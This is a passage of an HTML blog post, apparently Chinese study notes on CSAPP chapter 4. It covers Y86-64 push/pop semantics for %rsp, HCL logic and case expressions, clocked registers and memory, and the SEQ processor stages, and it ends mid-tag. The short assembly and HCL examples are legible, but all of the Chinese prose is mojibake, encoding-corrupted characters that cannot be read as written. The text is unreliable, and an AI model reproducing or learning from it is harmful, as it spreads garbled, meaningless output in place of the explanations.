å¼€å¤´çš„è¯æ˜¯æ±‡ç¼–å™¨ä¼ªæŒ‡ä»¤ï¼Œä»–ä»¬å‘Šè¯‰æ±‡ç¼–å™¨å°å“¦æ­£åœ°å€ï¼Œä»¥ä¾¿äº§ç”Ÿä»£ç æˆ–è€…æ’å…¥æ•°æ®ã€‚ä¾‹å¦‚ <code>.pos 0</code> å‘Šè¯‰æ±‡ç¼–å™¨åº”è¯¥ä»åœ°å€0 å¤„äº§ç”Ÿä»£ç ã€‚</p><p>å…¶ä»–çš„ä»£ç æŒ‡ä»¤å’Œ x86-64å«ä¹‰ç›¸åŒï¼Œæˆ‘ä»¬å¯ä»¥æ¨æ–­å‡ºè¿™ä¸ªå‡½æ•°ç›®çš„å®ç° <code>WORD sum(WORD *array,WORD length)</code>ï¼Œè€Œè¯¥å‡½æ•°ä¼šæ±‚å‡º array[0]~array[length] çš„å’Œã€‚</p><h3 id="ä¸€äº›-Y86-64-æŒ‡ä»¤çš„è¯¦æƒ…"><a href="#ä¸€äº›-Y86-64-æŒ‡ä»¤çš„è¯¦æƒ…" class="headerlink" title="ä¸€äº› Y86-64 æŒ‡ä»¤çš„è¯¦æƒ…"></a>ä¸€äº› Y86-64 æŒ‡ä»¤çš„è¯¦æƒ…</h3><p>éœ€è¦ç‰¹åˆ«æ³¨æ„ pushq æŒ‡ä»¤å’Œ popq æŒ‡ä»¤ã€‚</p><p>pushq æŒ‡ä»¤ä¼šæŠŠæ ˆæŒ‡é’ˆå‡ 8 ï¼Œå¹¶å°†ä¸€ä¸ªå¯„å­˜å™¨å€¼å†™å…¥å†…å­˜ä¸­ï¼Œå½“æˆ‘ä»¬æ‰§è¡Œ <code>pushq %rsp</code> æ—¶ï¼Œå¤„ç†å™¨çš„è¡Œä¸ºæ˜¯ä¸ç¡®å®šçš„ï¼Œå› ä¸ºå…¥æ ˆçš„å¯„å­˜å™¨ä¼šåœ¨è¿™æ¡æŒ‡ä»¤ä¸­è¢«æ›´æ”¹çŠ¶æ€ï¼Œè¿™ç§æƒ…å†µä¸‹å°±ä¼šå­˜åœ¨ä¸¤ç§ä¸åŒçš„ç»“æœï¼š</p><ul><li>å‹å…¥ %rsp çš„åŸå§‹å€¼ï¼ˆx86-64é‡‡ç”¨çš„çº¦å®šï¼‰</li><li>å‹å…¥å‡å» 8 çš„ %rsp çš„å€¼</li></ul><p>æˆ‘ä»¬è¿è¡Œä¹¦ä¸­çš„æµ‹è¯•ç¨‹åºï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs assembly">movq %rsp,%rax<br>pushq %rsp<br>popq %rdx<br>subq %rdx,%rax<br>ret<br></code></pre></td></tr></table></figure><p>å®ƒçš„è¿”å›å€¼æ€»æ˜¯0ï¼Œä¹Ÿå°±æ˜¯è¯´ pushq æŒ‡ä»¤æ˜¯å…ˆæ”¾åå‡ã€‚</p><p>åŒæ · popq ä¹Ÿæœ‰è¿™æ ·çš„æ­§ä¹‰ï¼Œæ ‘ä¸Šçš„æµ‹è¯•ç¨‹åºï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs assembly">movq %rsp,%rdi<br>pushq $0xabcd<br>popq %rsp<br>movq %rsp,%rax<br>movq %rdi,%rsp<br>ret<br></code></pre></td></tr></table></figure><p>å‡½æ•°çš„è¿”å›å€¼æ€»æ˜¯ 0xabcdï¼Œè¯´æ˜ <code>pop %rsp</code> æ˜¯å…ˆå‡å»äº† %rsp å†èµ‹çš„å€¼ã€‚</p><p>ä¹Ÿå°±æ˜¯è¯´ï¼Œpush å’Œ pop ä¸¤ä¸ªæŒ‡ä»¤åœ¨å¯¹ %rsp å¯„å­˜å™¨æœ¬èº«æ“ä½œæ—¶ï¼Œéƒ½ä¼šå°½é‡ä¿è¯å¾—åˆ°çš„å€¼æ˜¯åŸå§‹å€¼ã€‚</p><ul><li><p>pushq %rsp ä¸€å®šä¼šå‹æœ€åˆçš„ %rspã€‚</p></li><li><p>popq %rsp ä¸€å®šæ˜¯æŠŠé‚£ä¸ªå€¼æ­£ç¡®åœ°ç»™åˆ°äº† %rspã€‚</p></li></ul><h1 id="é€»è¾‘è®¾è®¡å’Œç¡¬ä»¶æ§åˆ¶è¯­è¨€-HCL"><a href="#é€»è¾‘è®¾è®¡å’Œç¡¬ä»¶æ§åˆ¶è¯­è¨€-HCL" class="headerlink" title="é€»è¾‘è®¾è®¡å’Œç¡¬ä»¶æ§åˆ¶è¯­è¨€ HCL"></a>é€»è¾‘è®¾è®¡å’Œç¡¬ä»¶æ§åˆ¶è¯­è¨€ HCL</h1><blockquote><p>è¿™éƒ¨åˆ†åº”è¯¥æ˜¯æ¨¡ç”µï¼ˆè¿˜æ˜¯å«æ•°ç”µï¼Ÿï¼‰çš„çŸ¥è¯†å­åº”è¯¥</p></blockquote><h3 id="é€»è¾‘é—¨"><a href="#é€»è¾‘é—¨" class="headerlink" title="é€»è¾‘é—¨"></a>é€»è¾‘é—¨</h3><p>é€»è¾‘é—¨æ˜¯æ•°å­¦ç”µè·¯çš„åŸºæœ¬è®¡ç®—å•å…ƒï¼Œå®ƒäº§ç”Ÿçš„è¾“å‡ºç­‰äºä»–ä»¬è¾“å…¥<strong>ä½å€¼</strong>çš„æŸä¸ªå¸ƒå°”å‡½æ•°ã€‚</p><p>å¸¸è§çš„é€»è¾‘é—¨å°±æ˜¯ and ã€or ã€notï¼Œå¹¶ä¸” and ã€or å¸¸è§ä¸ºä¸¤è¾“å…¥ï¼Œä½†æ˜¯å¯ä»¥æ‰©å±•åˆ° n è¾“å…¥çš„çŠ¶æ€ï¼Œæ¯”å¦‚ä¸‰è¾“å…¥çš„ä¸é—¨ç”¨ HCL è¡¨ç¤ºå°±ä¸º <code>a&amp;&amp;b&amp;&amp;c</code>ã€‚é€»è¾‘é—¨æ€»æ˜¯æ´»åŠ¨çš„ï¼Œä¸€æ—¦ä¸€ä¸ªé—¨çš„è¾“å…¥å‘ç”Ÿå˜åŒ–ï¼Œåœ¨å¾ˆçŸ­çš„æ—¶é—´å†…è¾“å‡ºä¹Ÿä¼šç›¸åº”å˜åŒ–ã€‚</p><h3 id="ç»„åˆç”µè·¯å’ŒHCL-å¸ƒå°”è¡¨è¾¾å¼"><a href="#ç»„åˆç”µè·¯å’ŒHCL-å¸ƒå°”è¡¨è¾¾å¼" class="headerlink" title="ç»„åˆç”µè·¯å’ŒHCL å¸ƒå°”è¡¨è¾¾å¼"></a>ç»„åˆç”µè·¯å’ŒHCL å¸ƒå°”è¡¨è¾¾å¼</h3><p>å°†å¾ˆå¤šçš„é€»è¾‘é—¨ç»„åˆæˆä¸€ä¸ªç½‘ï¼Œå°±èƒ½æ„å»ºè®¡ç®—å—ï¼Œæˆä¸ºç»„åˆç”µè·¯ã€‚å¦‚ä½•æ„å»ºè¿™äº›ç½‘æœ‰ä»¥ä¸‹çš„é™åˆ¶ï¼š</p><ul><li><p>æ¯ä¸ªé€»è¾‘é—¨çš„è¾“å…¥å¿…é¡»è¿æ¥åˆ°ä¸‰ä¸ªé€‰æ‹©é¡¹ä¹‹ä¸€ï¼šä¸€ä¸ªç³»ç»Ÿçš„è¾“å…¥ã€æŸä¸ªå¯„å­˜å™¨å•å…ƒçš„è¾“å…¥æˆ–æŸä¸ªé€»è¾‘é—¨çš„è¾“å…¥</p></li><li><p>ä¸¤ä¸ªæˆ–å¤šä¸ªé€»è¾‘é—¨çš„è¾“å…¥ä¸èƒ½è¿æ¥åœ¨ä¸€èµ·</p></li><li><p>ç½‘å¿…é¡»æ˜¯æ— ç¯çš„ï¼Œä¹Ÿå°±æ˜¯è¯´ä¸èƒ½å½¢æˆå›è·¯</p></li></ul><p>å¤šè·¯å¤ç”¨å™¨ï¼ˆMUXï¼‰æ ¹æ®è¾“å…¥æ§åˆ¶ä¿¡å·çš„å€¼ï¼Œä»ä¸€ç»„ä¸åŒçš„æ•°æ®ä¿¡å·ä¸­é€‰æ‹©ä¸€ä¸ªã€‚</p><p>HCL ç»„åˆé€»è¾‘ç”µè·¯å’Œ C è¯­è¨€é€»è¾‘è¡¨è¾¾å¼ä¹‹é—´æœ‰ä»¥ä¸‹ä¸åŒï¼š</p><ul><li><p>ç»„åˆç”µè·¯ä¼šæŒç»­åœ°å“åº”è¾“å…¥çš„å˜åŒ–ï¼ŒC è¯­è¨€åªä¼šåœ¨ç¨‹åºè¿è¡Œè¿‡ç¨‹ä¸­å¯¹åº”è¯­å¥è¢«æ‰§è¡Œåˆ°æ‰ä¼šè¿›è¡Œæ±‚å€¼</p></li><li><p>C è¯­è¨€çš„é€»è¾‘è¡¨è¾¾å¼å…è®¸å‚æ•°æ˜¯ä»»æ„æ•´æ•°ï¼Œä¼šè‡ªåŠ¨è½¬åŒ–ä¸º0 (false) å’Œé0 (true) ï¼Œè€Œé€»è¾‘é—¨åªå¯¹ä½å€¼ 0 å’Œ 1 è¿›è¡Œæ“ä½œ</p></li><li><p>C é€»è¾‘è¡¨è¾¾å¼å¯èƒ½ä¼šå‡ºç°éƒ¨åˆ†æ±‚å€¼çš„ç‰¹æ€§ï¼Œå¦‚æœä¸€ä¸ª and æˆ–è€… or è¿ç®—åªå¯¹ç¬¬ä¸€ä¸ªå‚æ•°æ±‚å€¼ä¹‹åå°±èƒ½ç¡®å®šï¼Œé‚£ä¹ˆå°±ä¸ä¼šå¯¹ç¬¬äºŒä¸ªå‚æ•°æ±‚å€¼äº†ï¼Œè€Œç»„åˆé€»è¾‘ç”µè·¯æ²¡æœ‰è¿™ç§è§„åˆ™ã€‚</p></li></ul><h3 id="å­—çº§çš„ç»„åˆç”µè·¯å’ŒHCLæ•´æ•°è¡¨è¾¾å¼"><a href="#å­—çº§çš„ç»„åˆç”µè·¯å’ŒHCLæ•´æ•°è¡¨è¾¾å¼" class="headerlink" title="å­—çº§çš„ç»„åˆç”µè·¯å’ŒHCLæ•´æ•°è¡¨è¾¾å¼"></a>å­—çº§çš„ç»„åˆç”µè·¯å’ŒHCLæ•´æ•°è¡¨è¾¾å¼</h3><p>åˆ©ç”¨é€»è¾‘é—¨ç»„åˆæˆçš„ç½‘ï¼Œæˆ‘ä»¬å°±å¯ä»¥è®¾è®¡å‡ºå¯¹æ•°æ®å­—æ“ä½œçš„ç”µè·¯ã€‚å…¶ä¸­ï¼Œç»„åˆç”µè·¯åˆ†å±€è¾“å…¥å­—çš„æ¯ä¸ªä½ï¼Œç”¨é€»è¾‘é—¨åˆ†åˆ«è®¡ç®—è¾“å‡ºå­—çš„æ¯ä¸€ä½ã€‚</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%9B%9B%E7%AB%A0-%E5%A4%84%E7%90%86%E5%99%A8%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/4-%E5%AD%97%E7%BA%A7%E7%BB%84%E5%90%88%E7%94%B5%E8%B7%AF.png"></p><p>åœ¨ HCL ä¸­ï¼Œå¤šè·¯å¤ç”¨å‡½æ•°ä½¿ç”¨<strong>æƒ…å†µè¡¨è¾¾å¼</strong>æ¥æè¿°çš„ï¼Œæƒ…å†µè¡¨è¾¾å¼çš„é€šç”¨æ ¼å¼å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs hcl">[<br>select1:expr1;<br>select2:expr2;<br>select3:expr3;<br>...<br>selectk:exprk;<br>]<br></code></pre></td></tr></table></figure><p>è¡¨è¾¾å¼åŒ…å«ä¸€ç³»åˆ—çš„æƒ…å†µï¼Œæ¯ç§æƒ…å†µ i éƒ½æœ‰ä¸€ä¸ªå¸ƒå°”è¡¨è¾¾å¼ select å’Œä¸€ä¸ªæ•´æ•°è¡¨è¾¾å¼ expr ï¼Œåˆ†åˆ«è¡¨ç¤ºä»€ä¹ˆæ—¶å€™é€‰æ‹©è¿™ç§æƒ…å†µå’Œä¼šå¾—åˆ°ä»€ä¹ˆå€¼ã€‚</p><p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œæƒ…å†µè¡¨è¾¾å¼å¹¶<strong>ä¸è¦æ±‚å„ä¸ªä¸åŒçš„é€‰é¡¹ä¹‹é—´äº’æ–¥</strong>ï¼Œä½†æ˜¯å¹¶ä¸ä¼šå‡ºç°å¤šä¸ªç»“æœï¼Œåœ¨å®é™…çš„é€‰æ‹©è¿‡ç¨‹ä¸­æ˜¯æŒ‰<strong>é¡ºåºè¿›è¡Œ</strong>çš„ï¼Œä¸”ç¬¬ä¸€ä¸ªæ±‚å€¼ä¸º1çš„æƒ…å†µä¼šè¢«é€‰ä¸­ã€‚</p><p>egï¼šè®¾è®¡ä¸€ä¸ªé€»è¾‘ç”µè·¯æ¥æ‰¾ä¸€ç»„å­—  aã€bã€c çš„æœ€å°å€¼ï¼Œå°±å¯ä»¥è¿™æ ·è¡¨è¾¾ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs hcl">word min=[<br>a&lt;=b &amp;&amp;a&lt;=c : a;<br>b&lt;=a &amp;&amp;b&lt;=c : b;<br>1           : c;<br>]<br></code></pre></td></tr></table></figure><p>å…¶ä¸­æœ€åä¸€ä¸ªé€‰æ‹©è¡¨è¾¾å¼1ï¼Œæ„å‘³å¦‚æœå‰é¢çš„éƒ½æ²¡æœ‰è¢«é€‰ä¸­ï¼Œé‚£å°±é€‰æ‹©è¿™ç§æƒ…å†µã€‚è¿™ä¹Ÿæ˜¯æ¯”è¾ƒå¸¸ç”¨çš„æŒ‡å®šé»˜è®¤æƒ…å†µçš„æ–¹æ³•ã€‚</p><h3 id="é›†åˆå…³ç³»"><a href="#é›†åˆå…³ç³»" class="headerlink" title="é›†åˆå…³ç³»"></a>é›†åˆå…³ç³»</h3><p>é›†åˆå…³ç³»ç”¨æ¥å°†ä¸€ä¸ªä¿¡å·ä¸è®¸å¤šå¯èƒ½åŒ¹é…çš„ä¿¡å·ä½œæ¯”è¾ƒï¼Œä»¥æ­¤æ¥æ£€æµ‹æ­£åœ¨å¤„ç†çš„æŸä¸ªæŒ‡ä»¤æ˜¯å¦<strong>å±äº</strong>æŸä¸€ç±»æŒ‡ä»¤ä»£ç ã€‚</p><p>åˆ¤æ–­é›†åˆå…³ç³»çš„é€šç”¨æ ¼å¼æ˜¯ï¼š</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">iexpr in </span><span class="hljs-template-variable">&#123;iexpr1,iexpr2,...,iexprk&#125;</span><br></code></pre></td></tr></table></figure><h3 id="å­˜å‚¨å™¨æ—¶é’Ÿ"><a href="#å­˜å‚¨å™¨æ—¶é’Ÿ" class="headerlink" title="å­˜å‚¨å™¨æ—¶é’Ÿ"></a>å­˜å‚¨å™¨æ—¶é’Ÿ</h3><p>ç»„åˆç”µè·¯ä»æœ¬è´¨ä¸Šè®²å¹¶ä¸å­˜å‚¨ä»»ä½•ä¿¡æ¯ï¼Œæˆ‘ä»¬æƒ³è¦äº§ç”Ÿæ—¶åºç”µè·¯å¿…é¡»å¼•è¿›æŒ‰ä½å­˜å‚¨ä¿¡æ¯çš„è®¾å¤‡ã€‚</p><p>å­˜å‚¨è®¾å¤‡éƒ½æ˜¯ç”±åŒä¸€ä¸ªæ—¶é’Ÿæ§åˆ¶çš„ï¼Œæ—¶é’Ÿæ˜¯ä¸€ä¸ªå‘¨æœŸæ€§çš„ä¿¡å·ï¼Œå†³å®šä»€ä¹ˆæ—¶å€™è¦æŠŠæ–°å€¼åŠ è½½åˆ°è®¾å¤‡ä¸­ã€‚æˆ‘ä»¬è€ƒè™‘ä»¥ä¸‹ä¸¤ç§å­˜å‚¨å™¨è®¾å¤‡ï¼š</p><ul><li>æ—¶é’Ÿå¯„å­˜å™¨ï¼ˆç®€ç§°å¯„å­˜å™¨ï¼‰ï¼šå­˜å‚¨å•ä¸ªä½æˆ–å­—ï¼Œæ—¶é’Ÿä¿¡å·æ§åˆ¶å¯„å­˜å™¨åŠ è½½è¾“å…¥å€¼ã€‚</li><li>éšæœºè®¿é—®å­˜å‚¨å™¨ï¼ˆç®€ç§°å†…å­˜ï¼ŒRandom Access Memoryï¼‰ï¼šå­˜å‚¨å¤šä¸ªå­—ï¼Œé€šè¿‡åœ°å€é€‰æ‹©è¯¥è¯»æˆ–è¯¥å†™å“ªäº›å­—ã€‚</li></ul><p>éœ€è¦æ³¨æ„çš„æ˜¯ç¡¬ä»¶ä¸­çš„ â€å¯„å­˜å™¨â€œ å’Œæœºå™¨çº§ç¼–ç¨‹ä¸­çš„ â€å¯„å­˜å™¨â€œ å¹¶ä¸æ˜¯å®Œå…¨ç›¸åŒçš„æ¦‚å¿µï¼Œç¡¬ä»¶ä¸­çš„å¯„å­˜å™¨æ˜¯ä¸€ä¸ªç”µå­å…ƒä»¶ï¼Œæœºå™¨ç¼–ç¨‹ä¸­å¯„å­˜å™¨ä»£è¡¨ CPU ä¸­å¯å¯»å€çš„å­—ï¼Œå®ƒä»¬å­˜å‚¨åœ¨å¯„å­˜å™¨æ–‡ä»¶ä¸­ã€‚æˆ‘ä»¬åˆ†åˆ«ç§°å‘¼è¿™ä¸¤ç±»å¯„å­˜å™¨ä½ â€ç¡¬ä»¶å¯„å­˜å™¨â€œ å’Œ â€ç¨‹åºå¯„å­˜å™¨â€œã€‚</p><p>å¤§å¤šæ—¶å€™ï¼Œå¯„å­˜å™¨è¾“å‡ºä¼šä¸€ç›´ä¿æŒåœ¨å½“å‰çš„å¯„å­˜å™¨çŠ¶æ€ä¸Šï¼Œåªæœ‰æ¯ä¸ªæ—¶é’Ÿåˆ°è¾¾ä¸Šå‡æ²¿æ—¶ï¼Œå€¼æ‰ä¼šä»å¯„å­˜å™¨çš„è¾“å…¥ä¼ é€åˆ°è¾“å‡ºã€‚</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%9B%9B%E7%AB%A0-%E5%A4%84%E7%90%86%E5%99%A8%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/4-%E5%AF%84%E5%AD%98%E5%99%A8%E6%96%87%E4%BB%B6.png"></p><p>å¦‚ä¸Šå›¾ï¼Œæ¯ä¸ªå¯„å­˜å™¨æ–‡ä»¶éƒ½æœ‰ä¸¤ä¸ªè¯»ç«¯å£å’Œä¸€ä¸ªå†™ç«¯å£ã€‚è¿™æ ·çš„å¤šç«¯å£è®¿é—®æœºåˆ¶å…è®¸åŒæ—¶è¿›è¡Œå¤šä¸ªè¯»å’Œå†™æ“ä½œã€‚</p><p>åŒæ ·ï¼Œå› ä¸ºå¯ä»¥åŒæ—¶è¿›è¡Œå¤šä¸ªè¯»å†™æ“ä½œï¼Œå°±ä¸å¯é¿å…åœ°å‘ç”Ÿå†²çªã€‚è¿™æ—¶å€™æˆ‘ä»¬çš„éšæœºè®¿é—®å¯„å­˜å™¨å°±æ´¾ä¸Šäº†ç”¨åœºã€‚</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%9B%9B%E7%AB%A0-%E5%A4%84%E7%90%86%E5%99%A8%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/4-%E9%9A%8F%E6%9C%BA%E8%AE%BF%E9%97%AE%E5%AF%84%E5%AD%98%E5%99%A8.png"></p><p>è¿™ä¸ªå†…å­˜æœ‰ä¸€ä¸ªåœ°å€è¾“äººï¼Œä¸€ä¸ªå†™çš„æ•°æ®è¾“å…¥ï¼Œä»¥åŠä¸€ä¸ªè¯»çš„æ•°æ®è¾“å‡ºã€‚</p><p>å…¶ä¸­ä»å†…å­˜ä¸­è¯»çš„æ“ä½œç±»ä¼¼äºç»„åˆé€»è¾‘ï¼Œå¦‚æœæˆ‘ä»¬åœ¨è¾“å…¥ address ä¸Šæä¾›ä¸€ä¸ªåœ°å€, å¹¶å°† write æ§åˆ¶ä¿¡å·è®¾ç½®ä¸º 0, é‚£ä¹ˆåœ¨ç»è¿‡ä¸€äº›å»¶è¿Ÿä¹‹åï¼Œå­˜å‚¨åœ¨é‚£ä¸ªåœ°å€ä¸Šçš„å€¼ä¼šå‡ºç°åœ¨è¾“å‡º data ä¸Šï¼Œå†…å­˜å°†ä¸ä¼šå“åº”è¾“å…¥åœ°å€ä¸Šçš„æ•°æ®å†™å…¥è¯·æ±‚ã€‚å¦‚æœåœ°å€è¶…å‡ºäº†èŒƒå›´ï¼Œerror ä¿¡å·ä¼šè®¾ç½®ä¸º 1ï¼Œå¦åˆ™å°±è®¾ç½®ä¸º 0ã€‚</p><p>å†™å†…å­˜æ˜¯ç”±æ—¶é’Ÿæ§åˆ¶çš„ï¼šæˆ‘ä»¬å°† address è®¾ç½®ä¸ºæœŸæœ›çš„åœ°å€ï¼Œå°† data in è®¾ç½®ä¸ºæœŸæœ›çš„å€¼ï¼Œ write è®¾ç½®ä¸º 1ã€‚ç„¶åå½“æˆ‘ä»¬æ§åˆ¶æ—¶é’Ÿæ—¶ï¼Œåªè¦åœ°å€æ˜¯åˆæ³•çš„ï¼Œå°±ä¼šæ›´æ–°å†…å­˜ä¸­æŒ‡å®šçš„ä½ç½®ã€‚</p><p>å¯¹äºè¯»æ“ä½œæ¥è¯´ï¼Œå¦‚æœåœ°å€æ˜¯ä¸åˆæ³•çš„ï¼Œerror ä¿¡å·ä¼šè¢«è®¾ç½®ä¸º 1ã€‚è¿™ä¸ªä¿¡å·æ˜¯ç”±ç»„åˆé€»è¾‘äº§ç”Ÿçš„ï¼Œ å› ä¸ºæ‰€éœ€è¦çš„è¾¹ç•Œæ£€æŸ¥çº¯ç²¹å°±æ˜¯åœ°å€è¾“äººçš„å‡½æ•°ï¼Œä¸æ¶‰åŠä¿å­˜ä»»ä½•çŠ¶æ€ã€‚</p><h1 id="Y86-64çš„é¡ºåºå®ç°"><a href="#Y86-64çš„é¡ºåºå®ç°" class="headerlink" title="Y86-64çš„é¡ºåºå®ç°"></a>Y86-64çš„é¡ºåºå®ç°</h1><p>é¦–å…ˆï¼Œæˆ‘ä»¬æè¿°ä¸€ä¸ªç§°ä¸º SEQ çš„å¤„ç†å™¨ã€‚æ¯ä¸ªæ—¶é’Ÿå‘¨æœŸä¸Šï¼ŒSEQ æ‰§è¡Œå¤„ç†ä¸€æ¡å®Œæ•´æŒ‡ä»¤æ‰€éœ€çš„æ‰€æœ‰æ­¥éª¤ã€‚ä½†è¿™éœ€è¦ä¸€ä¸ªå¾ˆé•¿çš„å‘¨æœŸï¼Œæˆ‘ä»¬éœ€è¦æ”¹è¿›è¿™ä¸ªç¼ºç‚¹ï¼Œç¼©çŸ­æ—¶é’Ÿçš„å‘¨æœŸï¼Œä»¥å®ç°æœ€ç»ˆçš„ç›®çš„â€”â€”<strong>å®ç°ä¸€ä¸ªé«˜æ•ˆã€æµæ°´çº¿åŒ–çš„å¤„ç†å™¨</strong>ã€‚</p><h3 id="å°†å¤„ç†ç»„ç»‡æˆé˜¶æ®µ"><a href="#å°†å¤„ç†ç»„ç»‡æˆé˜¶æ®µ" class="headerlink" title="å°†å¤„ç†ç»„ç»‡æˆé˜¶æ®µ"></a>å°†å¤„ç†ç»„ç»‡æˆé˜¶æ®µ</h3><p>å¤„ç†ä¸€æ¡æŒ‡ä»¤åŒ…æ‹¬å¾ˆå¤šæ“ä½œï¼Œä¸»è¦æœ‰ä»¥ä¸‹å‡ ä¸ªé˜¶æ®µï¼š</p><ul><li><p>å–æŒ‡ ï¼ˆfetchï¼‰</p><p>å–æŒ‡æ˜¯æŒ‡ä»å†…å­˜ä¸­è¯»å–æŒ‡ä»¤æ“ä½œ<del>ï¼ˆä¸æ˜¯æ‰“é”™å­—äº†ï¼‰</del>ï¼Œåœ°å€ä¸ºç¨‹åºè®¡æ•°å™¨çš„å€¼ã€‚ä»æŒ‡ä»¤ä¸­æŠ½å–å‡ºæŒ‡ä»¤æŒ‡ç¤ºç¬¦å­—èŠ‚çš„ä¸¤ä¸ªå››ä½éƒ¨åˆ†ï¼Œç§°ä¸º <em>icode</em>ï¼ˆæŒ‡ä»¤ä»£ç ï¼‰å’Œ <em>ifun</em>ï¼ˆæŒ‡ä»¤åŠŸèƒ½ï¼‰ã€‚</p><p>å®ƒå¯èƒ½å–å‡ºä¸€ä¸ªå¯„å­˜å™¨æŒ‡ç¤ºç¬¦å­—èŠ‚ï¼ŒæŒ‡æ˜ä¸€ä¸ªæˆ–ä¸¤ä¸ªå¯„å­˜å™¨æ“ä½œæ•°æŒ‡ç¤ºç¬¦ rA å’Œ rB ã€‚å®ƒè¿˜å¯èƒ½å–å‡ºä¸€ä¸ªå››å­—èŠ‚å¸¸æ•°å­—valcã€‚å®ƒæŒ‰é¡ºåºæ–¹å¼è®¡ç®—å½“å‰æŒ‡ä»¤çš„ä¸‹ä¸€æ¡æŒ‡ä»¤çš„åœ°å€ <em>valP</em> ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼ŒvalP ç­‰äº PC çš„å€¼åŠ ä¸Šå·²å–å‡ºæŒ‡ä»¤çš„é•¿åº¦ã€‚</p></li><li><p>è¯‘ç ï¼ˆdecodeï¼‰</p><p>è¯‘ç é˜¶æ®µä»å¯„å­˜å™¨æ–‡ä»¶ä¸­è¯»å…¥æœ€å¤šä¸¤ä¸ªæ“ä½œæ•°ï¼Œå¾—åˆ°å€¼ <em>valA</em> å’Œ <em>valB</em>ã€‚é€šå¸¸ï¼Œå®ƒè¯»å…¥æŒ‡ä»¤rAå’ŒrBå­—æ®µæŒ‡æ˜çš„å¯„å­˜å™¨ï¼Œä¸è¿‡æœ‰äº›æŒ‡ä»¤æ˜¯è¯»å¯„å­˜å™¨ %rsp çš„ã€‚</p></li><li><p>æ‰§è¡Œï¼ˆexecuteï¼‰</p><p>åœ¨æ‰§è¡Œé˜¶æ®µï¼Œç®—æœ¯&#x2F;é€»è¾‘å•å…ƒï¼ˆALUï¼‰è¦ä¹ˆæ‰§è¡ŒæŒ‡ä»¤æŒ‡æ˜çš„æ“ä½œï¼ˆæ ¹æ®ifunçš„å€¼ï¼‰ï¼Œè®¡ç®—å†…å­˜å¼•ç”¨çš„æœ‰æ•ˆåœ°å€ï¼Œè¦ä¹ˆå¢åŠ æˆ–å‡å°‘æ ˆæŒ‡é’ˆã€‚å¾—åˆ°çš„å€¼æˆ‘ä»¬ç§°ä¸º <em>valE</em> ã€‚é™¤æ­¤ä¹‹å¤–æˆ‘ä»¬å¯ä»¥è®¾ç½®æ¡ä»¶ç æ¥é™åˆ¶ä¼ é€æ¡ä»¶ã€‚</p></li><li><p>è®¿å­˜ï¼ˆmemoryï¼‰</p><p>è®¿å­˜é˜¶æ®µå¯ä»¥å°†æ•°æ®å†™å…¥å†…å­˜ï¼Œæˆ–è€…ä»å†…å­˜è¯»å‡ºæ•°æ®ã€‚è¯»å‡ºçš„å€¼ä¸º <em>valM</em>ã€‚</p></li><li><p>å†™å›ï¼ˆwrite backï¼‰</p><p>å†™å›é˜¶æ®µæœ€å¤šå¯ä»¥å†™ä¸¤ä¸ªç»“æœåˆ°å¯„å­˜å™¨æ–‡ä»¶ã€‚</p></li><li><p>æ›´æ–°PCï¼ˆPC updateï¼‰</p><p>å°†PCè®¾ç½®æˆä¸‹ä¸€æ¡æŒ‡ä»¤çš„åœ°å€ï¼Œæ›´æ–° %rip å¯„å­˜å™¨ã€‚</p></li></ul><p>å¤„ç†å™¨æ— é™å¾ªç¯æ¥æ‰§è¡Œè¿™äº›é˜¶æ®µï¼Œåœ¨æˆ‘ä»¬ç®€åŒ–çš„å®ç°ä¸­ï¼Œä»»ä½•ä¸€ä¸ªé˜¶æ®µå¼‚å¸¸å¤„ç†å™¨éƒ½ä¼šåœæ­¢ã€‚</p><p>æˆ‘ä»¬é‡‡ç”¨é€šç”¨æ¡†æ¶æ¥å°†æŒ‡ä»¤æ˜ å°„åˆ°ç¡¬ä»¶ä¸­ï¼Œä¾‹å¦‚ä¸‹è¡¨æ˜¯å¯¹ Opqã€rrmovq å’Œ irmovq ç±»å‹çš„æŒ‡ä»¤æ‰€éœ€è¦çš„å¤„ç†ï¼š</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%9B%9B%E7%AB%A0-%E5%A4%84%E7%90%86%E5%99%A8%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/4-Y86-64%E6%8C%87%E4%BB%A4%E5%85%B7%E4%BD%93%E5%AE%9E%E7%8E%B0.png"></p><p>æ•´æ•°æ“ä½œéƒ½éµå¾ªä¸Šé¢çš„é€šç”¨æ¨¡å¼ï¼Œåœ¨å–æŒ‡é˜¶æ®µæˆ‘ä»¬ä¸éœ€è¦å¸¸æ•°ï¼ŒvalP çš„å€¼è®¡ç®—ä¸º PC+2 ã€‚</p><p>éœ€è¦æ³¨æ„ push æŒ‡ä»¤çš„å®ç°ï¼Œ%rsp çš„æŒ‡é’ˆæ˜¯å…ˆå‡å» 8 å†å†™å…¥çš„ï¼Œå…·ä½“æµç¨‹è§ä¸‹å›¾ï¼š</p><p><img 